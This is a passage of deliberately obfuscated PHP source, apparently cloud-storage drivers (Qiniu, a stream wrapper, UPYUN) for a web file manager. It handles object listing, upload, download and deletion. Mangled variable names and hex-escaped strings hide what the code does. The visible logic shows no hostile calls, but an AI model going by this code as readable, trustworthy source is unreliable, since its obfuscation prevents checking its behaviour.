$this->bucketManager->buildBatchDelete($this->bucket, $ˆÇğæº¶); list($Á€İöã, $’ƒ”â½Ë) = $this->bucketManager->batch($´Ğóã£); if ($’ƒ”â½Ë) { return !1; } } return !0; } public function rename($ŞõÖà, $ÑÖ—¾ÃË) { return $this->renameObject($ŞõÖà, $ÑÖ—¾ÃË); } public function fileInfo($õêÅÔ£†, $Øœş´œê = false, $—™ÑŒøĞ = array()) { $Ğ½¼½º¬ =& $_SERVER[ÓïÕü]; $åÄ‘¦¤¬ = array($Ğ½¼½º¬[32] => $this->pathThis($õêÅÔ£†), $Ğ½¼½º¬[87] => $this->getPathOuter($Ğ½¼½º¬[8] . $õêÅÔ£†), $Ğ½¼½º¬[33] => $Ğ½¼½º¬[233], $Ğ½¼½º¬[79] => isset($—™ÑŒøĞ[$Ğ½¼½º¬[1565]]) ? $—™ÑŒøĞ[$Ğ½¼½º¬[1565]] : 0, $Ğ½¼½º¬[169] => $this->ext($õêÅÔ£†)); if ($Øœş´œê) { return $åÄ‘¦¤¬; } $åÄ‘¦¤¬[$Ğ½¼½º¬[234]] = $åÄ‘¦¤¬[$Ğ½¼½º¬[88]] = 0; $åÄ‘¦¤¬[$Ğ½¼½º¬[235]] = $åÄ‘¦¤¬[$Ğ½¼½º¬[236]] = !0; if (empty($—™ÑŒøĞ)) { $—™ÑŒøĞ = $this->objectMeta($õêÅÔ£†); if (!$—™ÑŒøĞ) { return $åÄ‘¦¤¬; } } if (isset($—™ÑŒøĞ[$Ğ½¼½º¬[237]]) && $—™ÑŒøĞ[$Ğ½¼½º¬[237]]) { $åÄ‘¦¤¬[$Ğ½¼½º¬[238]] = $—™ÑŒøĞ[$Ğ½¼½º¬[237]]; } if (isset($—™ÑŒøĞ[$Ğ½¼½º¬[248]]) && $—™ÑŒøĞ[$Ğ½¼½º¬[248]]) { $åÄ‘¦¤¬[$Ğ½¼½º¬[238]] = $—™ÑŒøĞ[$Ğ½¼½º¬[248]]; } if (isset($—™ÑŒøĞ[$Ğ½¼½º¬[1566]])) { $åÄ‘¦¤¬[$Ğ½¼½º¬[88]] = substr($—™ÑŒøĞ[$Ğ½¼½º¬[1566]] . $Ğ½¼½º¬[12], 0, 10); } if (isset($—™ÑŒøĞ[$Ğ½¼½º¬[1565]])) { $åÄ‘¦¤¬[$Ğ½¼½º¬[79]] = $—™ÑŒøĞ[$Ğ½¼½º¬[1565]]; } return $åÄ‘¦¤¬; } public function folderInfo($Ö›àÂå½, $ ¸Â¿Ş… = false) { $Ù†ÍåäÎ =& $_SERVER[ÓïÕü]; $ÏãÅ¤Ëç = array($Ù†ÍåäÎ[32] => $this->pathThis($Ö›àÂå½), $Ù†ÍåäÎ[87] => $this->getPathOuter($Ù†ÍåäÎ[8] . $Ö›àÂå½), $Ù†ÍåäÎ[33] => $Ù†ÍåäÎ[78]); if ($ ¸Â¿Ş…) { return $ÏãÅ¤Ëç; } $ÏãÅ¤Ëç[$Ù†ÍåäÎ[234]] = $ÏãÅ¤Ëç[$Ù†ÍåäÎ[88]] = 0; $ÏãÅ¤Ëç[$Ù†ÍåäÎ[235]] = $ÏãÅ¤Ëç[$Ù†ÍåäÎ[236]] = !0; $Ö›àÂå½ = rtrim($Ö›àÂå½, $Ù†ÍåäÎ[8]) . $Ù†ÍåäÎ[8]; $ô‡£õ¢® = $this->objectMeta($Ö›àÂå½); if (isset($ô‡£õ¢®[$Ù†ÍåäÎ[1566]])) { $ÏãÅ¤Ëç[$Ù†ÍåäÎ[88]] = substr($ô‡£õ¢®[$Ù†ÍåäÎ[1566]] . $Ù†ÍåäÎ[12], 0, 10); } return $ÏãÅ¤Ëç; } public function listPath($ ôâ¹§œ, $„ª¥²Ê = false) { $Ùµ‰å†ã =& $_SERVER[ÓïÕü]; $ˆÍÃ¿¦É = $this->fileList($ ôâ¹§œ, $Ùµ‰å†ã[8], !0); foreach ($ˆÍÃ¿¦É[$Ùµ‰å†ã[85]] as $úáèàÓ => $œºôñ”) { $ˆÍÃ¿¦É[$Ùµ‰å†ã[85]][$úáèàÓ] = $this->folderInfo($œºôñ”, $„ª¥²Ê); } foreach ($ˆÍÃ¿¦É[$Ùµ‰å†ã[86]] as $úáèàÓ => $œºôñ”) { $ˆÍÃ¿¦É[$Ùµ‰å†ã[86]][$úáèàÓ] = $this->fileInfo($œºôñ”[$Ùµ‰å†ã[32]], $„ª¥²Ê, $œºôñ”); } return $ˆÍÃ¿¦É; } public function has($¥¶Â¤ó, $Íİí…Ú = false, $‹õ›Ëİ = true) { $½¢Ã¯íä =& $_SERVER[ÓïÕü]; $¥¶Â¤ó = trim($¥¶Â¤ó, $½¢Ã¯íä[8]); $‰üçŞ·ä = empty($¥¶Â¤ó) && $¥¶Â¤ó !== $½¢Ã¯íä[231] ? $½¢Ã¯íä[12] : $¥¶Â¤ó . $½¢Ã¯íä[8]; $Ù“¸àÛ¼ = $½¢Ã¯íä[12]; $Û‘Íëôæ = 500; $×‰‘Åõ¦ = $½¢Ã¯íä[8]; $ÆÂŸ­ïÑ = $®œÃê¤§ = 0; while (!0) { check_abort(); list($ëÉü‚Šõ, $Ú¼ïê¦İ) = $this->bucketManager->listFiles($this->bucket, $‰üçŞ·ä, $Ù“¸àÛ¼, $Û‘Íëôæ, $×‰‘Åõ¦); if ($Ú¼ïê¦İ) { break; } $Ù“¸àÛ¼ = array_key_exists($½¢Ã¯íä[1512], $ëÉü‚Šõ) ? $Ù“¸àÛ¼ = $ëÉü‚Šõ[$½¢Ã¯íä[1567]] : $½¢Ã¯íä[12]; if ($Íİí…Ú) { if (!empty($ëÉü‚Šõ[$½¢Ã¯íä[1568]])) { $ÆÂŸ­ïÑ += count($ëÉü‚Šõ[$½¢Ã¯íä[1568]]); } if (!empty($ëÉü‚Šõ[$½¢Ã¯íä[1569]])) { $®œÃê¤§ += count($ëÉü‚Šõ[$½¢Ã¯íä[1569]]); } if ($Ù“¸àÛ¼ === $½¢Ã¯íä[12]) { break; } continue; } if ($‹õ›Ëİ) { if (!empty($ëÉü‚Šõ[$½¢Ã¯íä[1568]])) { return !0; } } else { if (!empty($ëÉü‚Šõ[$½¢Ã¯íä[1569]])) { return !0; } } if ($Ù“¸àÛ¼ === $½¢Ã¯íä[12]) { break; } } if ($Íİí…Ú) { return array($½¢Ã¯íä[242] => $ÆÂŸ­ïÑ, $½¢Ã¯íä[243] => $®œÃê¤§); } return !1; } public function listAll($¥Ø äî±) { $ÚÁÉ‹ä =& $_SERVER[ÓïÕü]; $¼óøİ¾ = $this->fileList($¥Ø äî±, $ÚÁÉ‹ä[12], !0); $ÔØòà˜ = array_to_keyvalue($¼óøİ¾[$ÚÁÉ‹ä[86]], $ÚÁÉ‹ä[32]); foreach ($¼óøİ¾[$ÚÁÉ‹ä[85]] as $Ùü³ßÁ¿) { if (is_string($Ùü³ßÁ¿)) { $ÔØòà˜[$Ùü³ßÁ¿] = array($ÚÁÉ‹ä[79] => 0); } } return $this->listAllFiles($¥Ø äî±, $ÔØòà˜); } private function fileList($©‰³Ô‰É, $ìˆŒö«İ = '', $î¾ƒàº = 0) { $ğ«’şÄİ =& $_SERVER[ÓïÕü]; $©‰³Ô‰É = trim($©‰³Ô‰É, $ğ«’şÄİ[8]); $£©å—¢ä = empty($©‰³Ô‰É) && $©‰³Ô‰É !== $ğ«’şÄİ[231] ? $ğ«’şÄİ[12] : $©‰³Ô‰É . $ğ«’şÄİ[8]; $—›ì÷§ = $ğ«’şÄİ[12]; $êœŠŸ•ï = 1000; $¿üñ°ÖÖ = $ÎÜÛ†Ö = array(); while (!0) { check_abort(); list($Å—´´‡, $Ô×èÎ×) = $this->bucketManager->listFiles($this->bucket, $£©å—¢ä, $—›ì÷§, $êœŠŸ•ï, $ìˆŒö«İ); if ($Ô×èÎ×) { break; } $—›ì÷§ = array_key_exists($ğ«’şÄİ[1512], $Å—´´‡) ? $—›ì÷§ = $Å—´´‡[$ğ«’şÄİ[1567]] : $ğ«’şÄİ[12]; $û‚è½Óß = isset($Å—´´‡[$ğ«’şÄİ[1568]]) ? $Å—´´‡[$ğ«’şÄİ[1568]] : array(); $Î°²Äå¨ = isset($Å—´´‡[$ğ«’şÄİ[1569]]) ? $Å—´´‡[$ğ«’şÄİ[1569]] : array(); foreach ($û‚è½Óß as $ÁÈÙŞ©¿) { if ($ÁÈÙŞ©¿[$ğ«’şÄİ[97]] == $£©å—¢ä) { continue; } $‚·ìï‰È = $ÁÈÙŞ©¿[$ğ«’şÄİ[97]]; $£°ÇîÅ = $ÁÈÙŞ©¿[$ğ«’şÄİ[1565]]; $ÁÈÙŞ©¿[$ğ«’şÄİ[32]] = $‚·ìï‰È; $ÁÈÙŞ©¿[$ğ«’şÄİ[79]] = $£°ÇîÅ; $äË£ç³¿ = $£°ÇîÅ == 0 && substr($‚·ìï‰È, strlen($‚·ìï‰È) - 1, 1) == $ğ«’şÄİ[8] ? !0 : !1; $this->cacheMethodInfoSet($‚·ìï‰È, $äË£ç³¿, $ÁÈÙŞ©¿); if ($äË£ç³¿) { $¿üñ°ÖÖ[] = $‚·ìï‰È; continue; } $ÎÜÛ†Ö[] = $î¾ƒàº ? $ÁÈÙŞ©¿ : $‚·ìï‰È; } foreach ($Î°²Äå¨ as $‚·ìï‰È) { if ($‚·ìï‰È == $£©å—¢ä) { continue; } $¿üñ°ÖÖ[] = $‚·ìï‰È; $this->cacheMethodInfoSet($‚·ìï‰È, !0); } if ($—›ì÷§ === $ğ«’şÄİ[12]) { break; } } $this->cacheMethodInfoSet($©‰³Ô‰É, !0); return array($ğ«’şÄİ[85] => $¿üñ°ÖÖ, $ğ«’şÄİ[86] => $ÎÜÛ†Ö); } public function canRead($äûÙ¿Æ¬) { return $this->exist($äûÙ¿Æ¬) ? !0 : !1; } public function canWrite($…è­çğù) { return $this->exist($…è­çğù) ? !0 : !1; } public function getContent($ÊÈŒöØ¬) { return $this->fileSubstr($ÊÈŒöØ¬, 0, -1); } public function setContent($‹ÀÚÖ÷Ù, $Œ¢Éòå¥ = '') { $œŞççÁÍ = $this->tempFile($this->pathThis($‹ÀÚÖ÷Ù)); file_put_contents($œŞççÁÍ, $Œ¢Éòå¥); if ($this->upload($‹ÀÚÖ÷Ù, $œŞççÁÍ)) { $this->tempFileRemve($œŞççÁÍ); return !0; } return !1; } public function refreshUrls($Èª½ŒŠŠ) { $¦ï‹ñó =& $_SERVER[ÓïÕü]; $Ş¦ÆÆ’¨ = array(); if (is_array($Èª½ŒŠŠ)) { foreach ($Èª½ŒŠŠ as $îÒ•Ü¡”) { $Ş¦ÆÆ’¨[] = $this->link($îÒ•Ü¡”); } } else { $Ş¦ÆÆ’¨[] = $this->link($Èª½ŒŠŠ); } $Œ›Ùğ¯Ø = new Qiniu\Cdn\CdnManager($this->auth); list($Ñ€¤Ö·Š, $å»Äª) = $Œ›Ùğ¯Ø->refreshUrls($Ş¦ÆÆ’¨); if ($å»Äª) { return !1; } return $Ñ€¤Ö·Š[$¦ï‹ñó[1292]] == $¦ï‹ñó[850] ? !0 : !1; } public function fileSubstr($‚å®äÛí, $Ğ‰Š—Ë, $ì ¹…Ú) { $éø§Œ¡ï =& $_SERVER[ÓïÕü]; if (!($á‹ëÒÓá = $this->link($‚å®äÛí))) { return !1; } $›ƒóï„› = !1; if ($ì ¹…Ú > 0) { $Çúº˜® = $Ğ‰Š—Ë + $ì ¹…Ú - 1; $›ƒóï„› = array($éø§Œ¡ï[1570] . $Ğ‰Š—Ë . $éø§Œ¡ï[465] . $Çúº˜®); } $¬§ş¯°‡ = url_request($á‹ëÒÓá, $éø§Œ¡ï[1531], !1, $›ƒóï„›); return $¬§ş¯°‡[$éø§Œ¡ï[841]] ? $¬§ş¯°‡[$éø§Œ¡ï[1315]] : !1; } public function upload($»Ê÷ÎÃş, $êİÌùƒˆ, $²Æø¤Ô¾ = false, $­‹îÎĞ = REPEAT_REPLACE) { $Èâ—¿» = new Qiniu\Storage\UploadManager(); $Ñ˜÷˜é¬ = $this->auth->uploadToken($this->bucket, $»Ê÷ÎÃş); $¹¤ê¡á„ = get_file_mime(get_path_ext($êİÌùƒˆ)); list($›°Ïæº², $ô¶÷˜¤®) = $Èâ—¿»->putFile($Ñ˜÷˜é¬, $»Ê÷ÎÃş, $êİÌùƒˆ, null, $¹¤ê¡á„); return $ô¶÷˜¤® ? !1 : $this->getPathOuter($»Ê÷ÎÃş); } public function uploadFormData($‡ÂåÛ¦, $şü—Ê¶õ = 3600) { return $this->uploadToken($‡ÂåÛ¦, $şü—Ê¶õ); } public function uploadMultiData($®‹“ğŸ“, $³™‹¿×ñ = 3600) { return $this->uploadToken($®‹“ğŸ“, $³™‹¿×ñ); } private function uploadToken($„·ğ£âå, $Õä€‚ñ‹ = 3600) { $³¢ç“ûè =& $_SERVER[ÓïÕü]; $õĞàøıü = $Õä€‚ñ‹; $Ÿ¶¯¡şö = array($³¢ç“ûè[1571] => $³¢ç“ûè[1572]); $Ë®ö±ı = $„·ğ£âå; $ÌóŒóĞ“ = $this->auth->uploadToken($this->bucket, $Ë®ö±ı, $õĞàøıü, $Ÿ¶¯¡şö, !0); $ıõüÍ—ú = empty($this->region) || $this->region == $³¢ç“ûè[1573] ? $³¢ç“ûè[12] : $³¢ç“ûè[465] . $this->region; $àë¦ö¬± = http_type() . "\x3a\x2f\x2f\x75\160\154\157\141\x64{$ıõüÍ—ú}\56\x71\151\x6e\x69\x75\x70\56\x63\x6f\x6d\57"; return array($³¢ç“ûè[1574] => $ÌóŒóĞ“, $³¢ç“ûè[1575] => $àë¦ö¬±); } public function download($–ç‹¹ˆå, $ğ´ñØ…) { $²€½Üù = IO::getPathInner(IO::mkfile($ğ´ñØ…)); if (!($­¶°×Ëæ = $this->link($–ç‹¹ˆå))) { return !1; } $Ãß²‚¹ì = 0; $ó®È®ë = 1024 * 200; $åº›öšµ = fopen($²€½Üù, $_SERVER[ÓïÕü][1576]); while (!0) { $ˆŒº³¨¯ = $this->fileSubstr($–ç‹¹ˆå, $Ãß²‚¹ì, $ó®È®ë); if ($ˆŒº³¨¯ === !1) { return !1; } fwrite($åº›öšµ, $ˆŒº³¨¯); $Ãß²‚¹ì += $ó®È®ë; if (strlen($ˆŒº³¨¯) < $ó®È®ë) { break; } } fclose($åº›öšµ); return $ğ´ñØ…; } public function link($‘é¥¹µÁ, $›ÍˆÁÑ´ = '') { if (!$this->isFile($‘é¥¹µÁ)) { return !1; } $ÄŸÊ±’ö = $this->getHost() . $_SERVER[ÓïÕü][8] . $this->pathEncode($‘é¥¹µÁ) . $›ÍˆÁÑ´; return $this->auth->privateDownloadUrl($ÄŸÊ±’ö, 3600 * 12); } public function fileOut($»ç–Œóû, $çÅ†ô²™ = false, $£Ùİ²Ù = false, $Ø£¿’Ñ = '') { $ÖÉ„‹ =& $_SERVER[ÓïÕü]; if ($this->isFileOutServer()) { return $this->fileOutServer($»ç–Œóû, $çÅ†ô²™, $£Ùİ²Ù, $Ø£¿’Ñ); } if (!$£Ùİ²Ù) { $£Ùİ²Ù = $this->pathThis($»ç–Œóû); } $´¹Äê€© = $çÅ†ô²™ ? $ÖÉ„‹[1577] . rawurlencode($£Ùİ²Ù) : $ÖÉ„‹[12]; $«¨ÖÔÍê = $this->link($»ç–Œóû, $´¹Äê€©); $this->fileOutLink($«¨ÖÔÍê); } public function fileOutServer($Ÿò¤Åïİ, $®·Á¤üÕ = false, $Í„Ù»í = false, $³Ÿù•¸ã = '') { parent::fileOut($Ÿò¤Åïİ, $®·Á¤üÕ, $Í„Ù»í, $³Ÿù•¸ã); } public function fileOutImage($Éáş”µä, $¯Ïïäè¥ = 250) { if ($this->size($Éáş”µä) > 1024 * 1024 * 20) { return $this->fileOutImageServer($Éáş”µä, $¯Ïïäè¥); } $Ü’®ÕÀÒ = $this->link($Éáş”µä, $_SERVER[ÓïÕü][1578] . $¯Ïïäè¥); $this->fileOutLink($Ü’®ÕÀÒ); } public function fileOutImageServer($ì¼ç¤Ú², $îÅ‘Óİ· = 250) { parent::fileOutImage($ì¼ç¤Ú², $îÅ‘Óİ·); } public function hashMd5($±¯íšë£) { $ğ€ìÆ¡ˆ =& $_SERVER[ÓïÕü]; $¹óË…£ù = $this->objectMeta($±¯íšë£); return isset($¹óË…£ù[$ğ€ìÆ¡ˆ[248]]) ? $¹óË…£ù[$ğ€ìÆ¡ˆ[248]] : !1; $èâ¹äçş = $this->link($±¯íšë£, $ğ€ìÆ¡ˆ[1579]); } public function size($ËØœà—ƒ) { $«‰…±ê¾ = $this->objectMeta($ËØœà—ƒ); return $«‰…±ê¾ ? $«‰…±ê¾[$_SERVER[ÓïÕü][79]] : 0; } public function info($Ü«£ôĞ·) { if ($this->isFolder($Ü«£ôĞ·)) { return $this->folderInfo($Ü«£ôĞ·); } else { if ($this->isFile($Ü«£ôĞ·)) { return $this->fileInfo($Ü«£ôĞ·); } } return !1; } public function exist($¥±¤£Å‘) { return $this->isFile($¥±¤£Å‘) || $this->isFolder($¥±¤£Å‘); } public function isFile($à¤çú) { return !$this->isFolder($à¤çú) && $this->objectMeta($à¤çú); } public function isFolder($¸¸È¬ê¾) { return $this->cacheMethod($_SERVER[ÓïÕü][180], $¸¸È¬ê¾); } protected function objectMeta($ãá®‰ÖÜ) { return $this->cacheMethod($_SERVER[ÓïÕü][182], $ãá®‰ÖÜ); } protected function _objectMeta($ÑÓ¥¬ƒ) { $•ÅÑÅˆ½ =& $_SERVER[ÓïÕü]; list($ƒ ƒÁ²Û, $¡æÂ§·–) = $this->bucketManager->stat($this->bucket, $ÑÓ¥¬ƒ); if ($ƒ ƒÁ²Û) { $ƒ ƒÁ²Û[$•ÅÑÅˆ½[79]] = intval($ƒ ƒÁ²Û[$•ÅÑÅˆ½[1565]]); } return $ƒ ƒÁ²Û; } protected function _isFolder($Ü”áˆÜ¬) { $€Äµ®Ç =& $_SERVER[ÓïÕü]; if ($Ü”áˆÜ¬ == $€Äµ®Ç[12] || $Ü”áˆÜ¬ == $€Äµ®Ç[8]) { return !0; } list($‰‘ã‚ıç, $¦ô°Ñ) = $this->bucketManager->listFiles($this->bucket, trim($Ü”áˆÜ¬, $€Äµ®Ç[8]) . $€Äµ®Ç[8], $€Äµ®Ç[12], 1, $€Äµ®Ç[8]); return !empty($‰‘ã‚ıç[$€Äµ®Ç[1568]]) || !empty($‰‘ã‚ıç[$€Äµ®Ç[1569]]) ? !0 : !1; } } class PathDriverStream extends PathDriverBase { const TYPE_STRING = 1; const TYPE_FILE = 2; public function __construct($ÑòÁÒ˜ª, $«ñ±ô‹­ = 0) { parent::__construct(); $this->source = $ÑòÁÒ˜ª; $this->sourceSize = $«ñ±ô‹­; if (is_string($this->source)) { $this->sourceType = self::TYPE_STRING; $this->sourceSize = strlen($this->source); } else { $this->sourceType = self::TYPE_FILE; } } public function size($±á›¾Ó­ = false) { return $this->sourceSize; } public function getContent($÷äàô©¸ = false) { return $this->fileSubstr($÷äàô©¸, 0, $this->sourceSize); } public function fileSubstr($¤‡›œş = false, $¦•ö¨Ç = 0, $…ãßÍÛÀ = 0) { if (!$…ãßÍÛÀ) { $…ãßÍÛÀ = $this->sourceSize; } $ı‚ËçöÖ = $this->sourceSize - $¦•ö¨Ç; if ($…ãßÍÛÀ >= $ı‚ËçöÖ) { $…ãßÍÛÀ = $ı‚ËçöÖ; } if ($this->sourceType == self::TYPE_STRING) { return substr($this->source, $¦•ö¨Ç, $…ãßÍÛÀ); } if ($this->sourceType == self::TYPE_FILE) { if ($…ãßÍÛÀ <= 0) { return $_SERVER[ÓïÕü][12]; } $“ÇíŒç« = ftell($this->source); fseek_64($this->source, $“ÇíŒç« + $¦•ö¨Ç); $çí—†»ï = @fread($this->source, $…ãßÍÛÀ); fseek_64($this->source, $“ÇíŒç«); return $çí—†»ï; } } public function hashMd5($Û™¼ú¬‚ = false) { return md5($this->getContent()); } public static function hash($Õ’šĞóÑ, $êŠ’ŞÖ‰ = 0) { $±Ïêİì® = new PathDriverStream($Õ’šĞóÑ, $êŠ’ŞÖ‰); return $±Ïêİì®->hashSimple($Õ’šĞóÑ); } public static function md5($œ•÷à¶, $Ä¼…‘˜å = 0) { $ŠéÂµñ = new PathDriverStream($œ•÷à¶, $Ä¼…‘˜å); return $ŠéÂµñ->hashMd5($œ•÷à¶); } } class PathDriverUSS extends PathDriverBase { protected $bucket = ''; protected $username = ''; protected $userpass = ''; protected $domain = ''; protected $token = ''; protected $endpoint = "\150\164\164\x70\72\x2f\57\x76\60\56\x61\160\x69\x2e\165\x70\171\x75\x6e\56\x63\x6f\x6d"; public $ioUploadServer = 0; public $ioFileOutServer = 0; public function __construct($øÙ¬£¾ğ) { parent::__construct(); $this->_init($øÙ¬£¾ğ); } public function _init($Í×Œè) { $Ç¸•« =& $_SERVER[ÓïÕü]; foreach ($Í×Œè as $«ºùƒ¨ => $¶†é–­) { if (isset($this->{$«ºùƒ¨})) { $this->{$«ºùƒ¨} = $¶†é–­; } } if (empty($this->username) || empty($this->userpass) || empty($this->domain)) { throw new Exception($Ç¸•«[1580] . LNG($Ç¸•«[1500])); } } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } private function ussHeaders($öà•í‰Ú, $º×°®×ì = "\x47\x45\x54") { $ßÎõÂ¼õ =& $_SERVER[ÓïÕü]; $şÌãæœâ = gmdate($ßÎõÂ¼õ[1529]); $‹­´ëÉ” = base64_encode(hash_hmac($ßÎõÂ¼õ[1581], "{$º×°®×ì}\x26{$öà•í‰Ú}\x26{$şÌãæœâ}", md5("{$this->userpass}"), !0)); $‘²Ã‚Îì = array("\101\x75\x74\x68\157\162\x69\172\x61\164\x69\157\156\72\x55\120\x59\125\x4e\40{$this->username}\x3a{$‹­´ëÉ”}", "\x44\141\164\145\72{$şÌãæœâ}"); return $‘²Ã‚Îì; } public function ussRequest($Ù³µÈä, $ãõ…óşë = "\107\105\x54", $§­‡¬¿ = false, $İùº¤ˆ¤ = false, $¤·ìé‰ = false) { $¹Ú½â„Õ =& $_SERVER[ÓïÕü]; $Ù³µÈä = trim($Ù³µÈä, $¹Ú½â„Õ[8]); $¼ô¸èÅ = "\57{$this->bucket}\x2f" . rawurlencode($Ù³µÈä); $¥ûËÑ¿Å = $this->ussHeaders($¼ô¸èÅ, $ãõ…óşë); if ($İùº¤ˆ¤) { $¥ûËÑ¿Å = array_merge($¥ûËÑ¿Å, $İùº¤ˆ¤); } $ç¬ëÆó™ = url_request($this->endpoint . $¼ô¸èÅ, $ãõ…óşë, $§­‡¬¿, $¥ûËÑ¿Å, $¤·ìé‰); if (!$ç¬ëÆó™) { $ä¨«ñ» = LNG($¹Ú½â„Õ[1582]); $this->writeLog($ä¨«ñ»); return array($¹Ú½â„Õ[1325] => !1, $¹Ú½â„Õ[1315] => $ä¨«ñ»); } if (strtolower($ãõ…óşë) == $¹Ú½â„Õ[230] || in_array($ç¬ëÆó™[$¹Ú½â„Õ[1325]], array($¹Ú½â„Õ[264], $¹Ú½â„Õ[1583]))) { $§­‡¬¿ = $ç¬ëÆó™[$¹Ú½â„Õ[1584]]; if (!$ç¬ëÆó™[$¹Ú½â„Õ[841]]) { $§­‡¬¿ = isset($§­‡¬¿[0]) ? $§­‡¬¿[0] : $¹Ú½â„Õ[12]; } } else { $§­‡¬¿ = json_decode($ç¬ëÆó™[$¹Ú½â„Õ[1315]], !0); if (!$§­‡¬¿) { $§­‡¬¿ = $ç¬ëÆó™[$¹Ú½â„Õ[1315]]; } else { if (!$ç¬ëÆó™[$¹Ú½â„Õ[841]] && isset($§­‡¬¿[$¹Ú½â„Õ[1585]])) { $§­‡¬¿ = $§­‡¬¿[$¹Ú½â„Õ[1585]]; } } } if (!$ç¬ëÆó™[$¹Ú½â„Õ[841]]) { $this->writeLog($this->__errorMessage($§­‡¬¿)); } return array($¹Ú½â„Õ[1325] => $ç¬ëÆó™[$¹Ú½â„Õ[841]], $¹Ú½â„Õ[1315] => $§­‡¬¿); } private function __errorMessage($®¯¿¥²²) { $›±ğŸàˆ =& $_SERVER[ÓïÕü]; if (!$®¯¿¥²²) { return $›±ğŸàˆ[12]; } static $÷§½Ä½˜ = null; if (!$÷§½Ä½˜) { $÷§½Ä½˜ = I18n::getType(); } if ($÷§½Ä½˜ != $›±ğŸàˆ[1538]) { return $®¯¿¥²²; } $¥ÀŞêñ = array($›±ğŸàˆ[1586] => $›±ğŸàˆ[1587], $›±ğŸàˆ[1588] => $›±ğŸàˆ[1589], $›±ğŸàˆ[1590] => $›±ğŸàˆ[1589], $›±ğŸàˆ[1591] => $›±ğŸàˆ[1592], $›±ğŸàˆ[1593] => $›±ğŸàˆ[1594], $›±ğŸàˆ[1595] => $›±ğŸàˆ[1596], $›±ğŸàˆ[1597] => $›±ğŸàˆ[1598]); return isset($¥ÀŞêñ[$®¯¿¥²²]) ? $¥ÀŞêñ[$®¯¿¥²²] : $®¯¿¥²²; } public function mkfile($ÅüËµ›Ø, $ÚÃé™„— = '', $Í‹±ÄèÛ = REPEAT_RENAME) { if ($this->setContent($ÅüËµ›Ø, $ÚÃé™„—)) { return $this->getPathOuter($ÅüËµ›Ø); } return !1; } public function mkdir($İ½„¼Ûé, $¢€¹È§’ = REPEAT_SKIP) { $êãã…ë =& $_SERVER[ÓïÕü]; $£¨ïè‚® = trim($İ½„¼Ûé, $êãã…ë[8]); if ($this->_isFolder($£¨ïè‚®)) { return $this->getPathOuter($£¨ïè‚®); } $Ô¨¸©Öí = array($êãã…ë[1599]); $‡ˆ½ËÉ½ = $this->ussRequest($£¨ïè‚®, $êãã…ë[291], !1, $Ô¨¸©Öí); return $‡ˆ½ËÉ½[$êãã…ë[1325]] ? $this->getPathOuter($£¨ïè‚®) : !1; } public function copyFile($Ç¾ÙÍ´£, $¸»Î×·ñ) { $á‡üÉ³­ =& $_SERVER[ÓïÕü]; $à¢ò¶Ş© = array($á‡üÉ³­[1600] . "\57{$this->bucket}\x2f{$Ç¾ÙÍ´£}", $á‡üÉ³­[1601]); $éêì›ı™ = $this->ussRequest($¸»Î×·ñ, $á‡üÉ³­[256], !1, $à¢ò¶Ş©); return $éêì›ı™[$á‡üÉ³­[1325]] ? !0 : $this->getPathOuter($¸»Î×·ñ); } public function moveFile($®à ™ê®, $Ï«®”åÔ) { $ß˜¦åóš =& $_SERVER[ÓïÕü]; $É‘‘Ôâ€ = array($ß˜¦åóš[1602] . "\57{$this->bucket}\57{$®à ™ê®}", $ß˜¦åóš[1601]); $Š’Í‘ú = $this->ussRequest($Ï«®”åÔ, $ß˜¦åóš[256], !1, $É‘‘Ôâ€); return $Š’Í‘ú[$ß˜¦åóš[1325]] ? !0 : $this->getPathOuter($Ï«®”åÔ); } public function delFile($ÏÑ Ò€Ä) { $Õ†æÉü‹ =& $_SERVER[ÓïÕü]; $¶à„ÙË = $this->ussRequest($ÏÑ Ò€Ä, $Õ†æÉü‹[1603]); return $¶à„ÙË[$Õ†æÉü‹[1325]] ? !0 : !1; } public function delFolder($ÖÆÙ…Õû) { $Ğ½ ‹òÚ =& $_SERVER[ÓïÕü]; if (!$this->exist($ÖÆÙ…Õû)) { return !0; } $this->listItemCache = !1; $ØóöÅú» = $‘—“Ú¹° = array(); $this->fileList($ÖÆÙ…Õû, $ØóöÅú», $‘—“Ú¹°, !0); $this->listItemCache = !0; foreach ($‘—“Ú¹° as $ûã‡¨Æ) { $à®ˆÕÛĞ = $this->ussRequest($ûã‡¨Æ[$Ğ½ ‹òÚ[32]], $Ğ½ ‹òÚ[1603]); if (!$à®ˆÕÛĞ[$Ğ½ ‹òÚ[1325]]) { return !1; } } usort($ØóöÅú», function ($ê×‰©ã¸, $‘ê”ì†Ë) { $¿îÒıñ =& $_SERVER[ÓïÕü]; return substr_count($‘ê”ì†Ë, $¿îÒıñ[8]) - substr_count($ê×‰©ã¸, $¿îÒıñ[8]); }); foreach ($ØóöÅú» as $ş¶Å¤) { $à®ˆÕÛĞ = $this->ussRequest($ş¶Å¤, $Ğ½ ‹òÚ[1603]); if (!$à®ˆÕÛĞ[$Ğ½ ‹òÚ[1325]]) { return !1; } } $à®ˆÕÛĞ = $this->ussRequest($ÖÆÙ…Õû, $Ğ½ ‹òÚ[1603]); return $à®ˆÕÛĞ[$Ğ½ ‹òÚ[1325]]; } public function rename($üÈÆ¯Œí, $Œ¥ášÍ¥) { if ($this->isFile($üÈÆ¯Œí)) { $Œ¥ášÍ¥ = get_path_father($üÈÆ¯Œí) . $Œ¥ášÍ¥; return $this->moveFile($üÈÆ¯Œí, $Œ¥ášÍ¥); } return $this->renameObject($üÈÆ¯Œí, $Œ¥ášÍ¥); } public function fileInfo($ùÕ³ë®Æ, $ãª…Ë = false, $º¾Ğ‰Èö = array()) { $–êâÍ¡Ù =& $_SERVER[ÓïÕü]; $¾¨óé† = array($–êâÍ¡Ù[32] => $this->pathThis($ùÕ³ë®Æ), $–êâÍ¡Ù[87] => $this->getPathOuter($–êâÍ¡Ù[8] . $ùÕ³ë®Æ), $–êâÍ¡Ù[33] => $–êâÍ¡Ù[233], $–êâÍ¡Ù[79] => isset($º¾Ğ‰Èö[$–êâÍ¡Ù[79]]) ? $º¾Ğ‰Èö[$–êâÍ¡Ù[79]] : 0, $–êâÍ¡Ù[169] => $this->ext($ùÕ³ë®Æ)); if ($ãª…Ë) { return $¾¨óé†; } $¾¨óé†[$–êâÍ¡Ù[234]] = $¾¨óé†[$–êâÍ¡Ù[88]] = 0; $¾¨óé†[$–êâÍ¡Ù[235]] = $¾¨óé†[$–êâÍ¡Ù[236]] = !0; if (empty($º¾Ğ‰Èö)) { $º¾Ğ‰Èö = $this->objectMeta($ùÕ³ë®Æ); if (!$º¾Ğ‰Èö) { return $¾¨óé†; } } 